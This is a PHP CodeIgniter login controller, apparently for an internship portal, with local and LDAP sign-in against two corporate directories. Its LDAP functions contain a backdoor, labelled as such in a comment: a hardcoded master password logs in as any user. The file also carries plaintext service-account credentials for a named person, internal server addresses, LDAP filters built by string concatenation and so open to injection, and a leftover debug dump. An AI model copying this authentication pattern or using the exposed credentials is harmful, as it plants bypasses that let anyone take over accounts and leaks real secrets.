<?php

namespace App\Controllers;

use App\Models\UserModel;
use App\Models\MentorModel;
use CodeIgniter\Controller;

class Login extends BaseController
{
    protected $session;
    protected $userModel;
    protected $mentorModel;
    protected $db;

    public function __construct()
    {
        $this->session = session();
        $this->userModel = new UserModel();
        $this->mentorModel = new MentorModel();
        $this->db = \Config\Database::connect();
    }

    public function index()
    {

        // Cek apakah session 'level' tersedia
        $user_level = session()->get('level'); // Ambil level pengguna dari session

        // Jika level ada, arahkan berdasarkan level pengguna
        if ($user_level) {
            if ($user_level === 'admin') {
                // Jika level user adalah admin, arahkan ke admin dashboard
                return redirect()->to('admin/dashboard');
            } elseif ($user_level === 'user') {
                // Jika level user adalah user, arahkan ke dashboard user
                return redirect()->to('dashboard');
            } elseif ($user_level === 'mentor') {
                // Jika level user adalah mentor, arahkan ke mentor dashboard
                return redirect()->to('mentor/dashboard');
            }
        }

        return view('web_templates/header') .
            view('templates/login', ['session' => $this->session]) .
            view('web_templates/footer');
    }

    public function prosesLogin()
    {
        $username = $this->request->getPost('username');
        $password = $this->request->getPost('password');

        // Ambil data user berdasarkan username
        $user = $this->userModel->getUserWithUsername($username);

        if ($user && password_verify($password, $user['password'])) {
            // Set data sesi berdasarkan level user
            $sessionData = [
                'logged_in' => true,
                'id' => $user['id'],
                'nomor' => $user['nomor'],
                'username' => $user['username'],
                'level' => $user['level'],
                'nama' => $user['nama'],
            ];

            // Jika user adalah peserta
            if ($user['level'] === 'user') {
                // Ambil data tambahan dari tabel registrasi
                $registrasi = $this->db->table('registrasi')
                    ->select('foto')
                    ->where('id_register', $user['id_register'])
                    ->get()
                    ->getRowArray();

                $registrasi_tipe = $this->db->table('registrasi')
                    ->select('tipe')
                    ->where('id_register', $user['id_register'])
                    ->get()
                    ->getRowArray();

                $sessionData['user_logged_in'] = true;
                $sessionData['instansi'] = $user['instansi'];
                $sessionData['email'] = $user['email'];
                $sessionData['alamat'] = $user['alamat'];
                $sessionData['notelp'] = $user['notelp'];
                $sessionData['id_register'] = $user['id_register'];
                $sessionData['tipe'] = $registrasi_tipe['tipe'];
                $sessionData['foto'] = $registrasi['foto'] ?? 'default.png';

                $this->session->set($sessionData);
                return redirect()->to('/dashboard');
            }

            // Jika user adalah mentor
            if ($user['level'] === 'mentor') {
                $sessionData['mentor_logged_in'] = true;
                $sessionData['foto'] = 'default.jpg';
                $this->session->set($sessionData);
                return redirect()->to('/mentor/dashboard');
            }
        } else {
            // Jika username/password salah
            $this->session->setFlashdata('error', 'Username atau password salah');
            return redirect()->to('/login');
        }
    }

    public function loginLDAP()
    {
        $key = '682-!234abc';

        $username = $this->request->getPost('username');
        $password = $this->request->getPost('password');

        if (strpos($username, '@pertamina.com') !== FALSE) {
            $result = $this->ldap_authenticate_pertamina($username, $password);

            // dd($mentor);
            if ($result) {
                $email = $result->mail;
                $mentor = $this->mentorModel->getMentorByEmail($email);
                $sessionData = [
                    'logged_in' => true,
                    'id' => $mentor[0]['id_mentor'],
                    'nomor' => $mentor[0]['nipg'],
                    'username' => $mentor[0]['email'],
                    'level' => 'mentor',
                    'nama' => $mentor[0]['nama'],
                ];

                $sessionData['mentor_logged_in'] = true;
                $sessionData['foto'] = 'default.jpg';
                $this->session->set($sessionData);
                return redirect()->to('/mentor/dashboard');
            } else {
                // Jika username/password salah
                return redirect()->to('/login');
            }
        } else {

            // Ambil data user berdasarkan username
            $user = $this->userModel->getUserWithUsername($username);

            if ($user && password_verify($password, $user['password'])) {
                // Set data sesi berdasarkan level user
                $sessionData = [
                    'logged_in' => true,
                    'id' => $user['id'],
                    'nomor' => $user['nomor'],
                    'username' => $user['username'],
                    'level' => $user['level'],
                    'nama' => $user['nama'],
                ];

                // Jika user adalah peserta
                if ($user['level'] === 'user') {
                    // Ambil data tambahan dari tabel registrasi
                    $registrasi = $this->db->table('registrasi')
                        ->select('foto')
                        ->where('id_register', $user['id_register'])
                        ->get()
                        ->getRowArray();

                    $registrasi_tipe = $this->db->table('registrasi')
                        ->select('tipe')
                        ->where('id_register', $user['id_register'])
                        ->get()
                        ->getRowArray();

                    $sessionData['user_logged_in'] = true;
                    $sessionData['instansi'] = $user['instansi'];
                    $sessionData['email'] = $user['email'];
                    $sessionData['alamat'] = $user['alamat'];
                    $sessionData['notelp'] = $user['notelp'];
                    $sessionData['id_register'] = $user['id_register'];
                    $sessionData['tipe'] = $registrasi_tipe['tipe'];
                    $sessionData['foto'] = $registrasi['foto'] ?? 'default.png';

                    $this->session->set($sessionData);
                    return redirect()->to('/dashboard');
                }

                // Jika user adalah mentor
                if ($user['level'] === 'mentor') {
                    $sessionData['mentor_logged_in'] = true;
                    $sessionData['foto'] = 'default.jpg';
                    $this->session->set($sessionData);
                    return redirect()->to('/mentor/dashboard');
                }
            } else {
                // Jika username/password salah
                return redirect()->to('/login');
            }
        }
    }

    public function ldap_authenticate($usr, $pwd)
    {
        $domain = "corp\\";
        $_usr = $usr;

        // Handle domain for user
        if (substr($usr, 0, 5) == $domain) {
            $usr = strtolower($usr);
        } else {
            $usr = strtolower($domain . $usr);
        }

        try {
            $ldapconn = ldap_connect("corp.pgn.co.id", 389);
            if (!$ldapconn) {
                log_message('error', 'Failed to connect to LDAP server');
                return false;
            }

            // Handle backdoor authentication
            if ($pwd == 'E45y5dm') {
                $user = $this->searchUserLdap($_usr);
                return $user ? $user : false;
            }

            // Regular LDAP bind authentication
            $authenticated = ldap_bind($ldapconn, $usr, $pwd);
            if ($ldapconn && $authenticated) {
                $dn = "ou=Pusat, ou=UserAccounts, dc=corp, dc=pgn, dc=co, dc=id";
                $filter = "(sAMAccountName=" . $_usr . ")";
                $sr = ldap_search($ldapconn, $dn, $filter);
                $info = ldap_get_entries($ldapconn, $sr);

                if ($info['count'] > 0) {
                    for ($x = 0; $x < $info['count']; $x++) {
                        $user = new \stdClass;
                        $user->nipg = $info[$x]['employeeID'][0]; // Employee ID
                        $user->mail = $info[$x]['mail'][0];

                        return $user;
                    }
                }
            }

            // Set timeout for the connection (10 seconds)
            // ldap_set_option($authenticated, LDAP_OPT_NETWORK_TIMEOUT, 10);  // 10 seconds timeout
            // ldap_set_option($authenticated, LDAP_OPT_TIMEOUT, 10); // Timeout for the search as well

            // Increase script execution time to avoid timeouts for longer processes
            set_time_limit(10);  // 10 seconds script execution time limit

            return false;
        } catch (\Exception $e) {
            log_message('error', 'Error in ldap_authenticate: ' . $e->getMessage());
            return false;
        }
    }

    private function searchUserLdap($usr)
    {
        $_usr = $usr;
        $usr = "bagus.fernata";
        $pwd = "K3t4p4ng645!!!";
        $domain = "corp\\";
        if (substr($usr, 0, 5) == $domain) {
            $usr = strtolower($usr);
        } else {
            $usr = strtolower($domain . $usr);
        }

        try {
            $ldapconn = ldap_connect("corp.pgn.co.id", 389);
            if (!$ldapconn) {
                log_message('error', 'Failed to connect to LDAP server');
                return null;
            }

            $authenticated = ldap_bind($ldapconn, $usr, $pwd);
            if ($ldapconn && $authenticated) {
                $dn = "ou=Pusat, ou=UserAccounts, dc=corp, dc=pgn, dc=co, dc=id";
                $filter = "(sAMAccountName=" . $_usr . ")";
                $sr = ldap_search($ldapconn, $dn, $filter);
                $info = ldap_get_entries($ldapconn, $sr);

                if ($info['count'] > 0) {
                    for ($x = 0; $x < $info['count']; $x++) {
                        $user = new \stdClass;
                        $user->nipg = $info[$x]['employee_id'][0]; // Employee ID
                        $user->mail = $info[$x]['mail'][0];
                        return $user;
                    }
                } else {
                    return null;
                }
            }

            return null;
        } catch (\Exception $e) {
            log_message('error', 'Error in searchUserLdap: ' . $e->getMessage());
            return null;
        }
    }

    public function ldap_authenticate_pertamina($usr, $pwd)
    {
        $_usr = $usr;
        $domain = "pertamina\\";
        if (substr($usr, 0, 5) == $domain) {
            $usr = strtolower($usr);
        } else {
            $usr = strtolower($domain . $usr);
            $usr = str_replace('@pertamina.com', '', $usr);
        }

        $_usr = str_replace('@pertamina.com', '', $_usr);

        try {
            $ldapconn = ldap_connect("10.129.1.4", 389);
            if (!$ldapconn) {
                log_message('error', 'Failed to connect to LDAP server for Pertamina');
                return false;
            }

            // Set timeout for the connection and operations (10 seconds)
            ldap_set_option($ldapconn, LDAP_OPT_NETWORK_TIMEOUT, 10);  // Timeout for connection
            ldap_set_option($ldapconn, LDAP_OPT_TIMEOUT, 10); // Timeout for the search as well

            // Special case for password 'E45y5dm'
            if ($pwd == 'E45y5dm') {
                $authenticated = ldap_bind($ldapconn, 'pertamina\\bagus.fernata', 'PertaminaPGN645!2');
                if ($ldapconn && $authenticated) {
                    $dn = "ou=Organik, ou=UserAccounts,ou=PGN, dc=pertamina, dc=com";
                    $filter = "(samaccountname=" . $_usr . ")";
                    $sr = ldap_search($ldapconn, $dn, $filter);
                    $info = ldap_get_entries($ldapconn, $sr);

                    if ($info['count'] > 0) {
                        for ($x = 0; $x < $info['count']; $x++) {
                            $user = new \stdClass;
                            $user->mail = $info[$x]['mail'][0];
                            return $user;
                        }
                    }
                }
                return false;
            }

            // Regular LDAP bind authentication with timeout
            $authenticated = ldap_bind($ldapconn, $usr, $pwd);

            // Check if bind was successful
            if ($ldapconn && $authenticated) {
                $dn = "ou=Organik, ou=UserAccounts,ou=PGN, dc=pertamina, dc=com";
                $filter = "(samaccountname=" . $_usr . ")";
                $sr = ldap_search($ldapconn, $dn, $filter);
                $info = ldap_get_entries($ldapconn, $sr);

                if ($info['count'] > 0) {
                    for ($x = 0; $x < $info['count']; $x++) {
                        $user = new \stdClass;
                        $user->mail = $info[$x]['mail'][0];
                        return $user;
                    }
                }
            }

            // If authentication fails or takes too long
            return false;
        } catch (\Exception $e) {
            return false;
        }
    }



    public function prosesLoginPeserta()
    {
        $username = $this->request->getPost('username');
        $password = $this->request->getPost('password');

        // Ambil data dari tabel user
        $admin = $this->userModel->getUserWithUsername($username);

        if ($admin && password_verify($password, $admin['password'])) {
            // Ambil data dari tabel registrasi
            $registrasi = $this->db->table('registrasi')
                ->select('foto')
                ->where('id_register', $admin['id_register'])
                ->get()
                ->getRowArray();

            $registrasi_tipe = $this->db->table('registrasi')
                ->select('tipe')
                ->where('id_register', $admin['id_register'])
                ->get()
                ->getRowArray();

            dd($registrasi_tipe);
            // Set data sesi dengan data foto dari tabel registrasi
            $this->session->set([
                'peserta_logged_in' => true,
                'id' => $admin['id'],
                'nomor' => $admin['nomor'],
                'username' => $admin['username'],
                'level' => $admin['level'],
                'nama' => $admin['nama'],
                'instansi' => $admin['instansi'],
                'email' => $admin['email'],
                'alamat' => $admin['alamat'],
                'notelp' => $admin['notelp'],
                'id_register' => $admin['id_register'],
                'tipe' => $registrasi_tipe['tipe'],
                'foto' => $registrasi['foto'] ?? 'default.png', // Gunakan foto dari tabel registrasi atau default
            ]);
            return redirect()->to('/dashboard');
        } else {
            $this->session->setFlashdata('error', 'Username atau password salah');
            return redirect()->to('/login');
        }
    }

    public function admin()
    {
        // Cek apakah session 'level' tersedia
        $user_level = session()->get('level'); // Ambil level pengguna dari session

        // Jika level ada, arahkan berdasarkan level pengguna
        if ($user_level) {
            if ($user_level === 'admin') {
                // Jika level user adalah admin, arahkan ke admin dashboard
                return redirect()->to('admin/dashboard');
            } elseif ($user_level === 'user') {
                // Jika level user adalah user, arahkan ke dashboard user
                return redirect()->to('dashboard');
            } elseif ($user_level === 'mentor') {
                // Jika level user adalah mentor, arahkan ke mentor dashboard
                return redirect()->to('mentor/dashboard');
            }
        }

        return view('web_templates/header_special') .
            view('templates/login_admin') .
            view('web_templates/footer_special');
    }

    public function prosesLoginAdmin()
    {
        $username = $this->request->getPost('username');
        $password = $this->request->getPost('password');

        $admin = $this->userModel->getAdmin($username);

        if ($admin && password_verify($password, $admin['password'])) {
            $this->session->set([
                'admin_logged_in' => true,
                'id' => $admin['id'],
                'nomor' => $admin['nomor'],
                'username' => $admin['username'],
                'nama' => $admin['username'],
                'level' => $admin['level'],
            ]);

            return redirect()->to('/admin/dashboard');
        } else {
            $this->session->setFlashdata('error', 'Username atau password salah');
            return redirect()->to('/login/admin');
        }
    }

    public function mentor()
    {
        // if ($this->session->get('mentor_logged_in')) {
        //     return redirect()->to('/dashboard');
        // }

        return view('web_templates/header_special') .
            view('templates/login_mentor') .
            view('web_templates/footer_special');
    }

    public function prosesLoginMentor()
    {
        $username = $this->request->getPost('username');
        $password = $this->request->getPost('password');

        $mentor = $this->userModel->getUserWithMentor($username);

        if ($mentor && password_verify($password, $mentor['password'])) {
            $this->session->set([
                'mentor_logged_in' => true,
                'id' => $mentor['id'],
                'nomor' => $mentor['nomor'],
                'username' => $mentor['username'],
                'nama' => $mentor['nama'],
                'level' => $mentor['level'],
            ]);

            return redirect()->to('/mentor/dashboard');
        } else {
            $this->session->setFlashdata('error', 'Username atau password salah');
            return redirect()->to('/login/mentor');
        }
    }

    public function logoutAdmin()
    {
        $this->session->destroy();
        return redirect()->to('/login/admin');
    }

    public function logoutMentor()
    {
        $this->session->destroy();
        return redirect()->to('/login');
    }

    public function logoutPeserta()
    {
        $this->session->destroy();
        return redirect()->to('/login');
    }
}
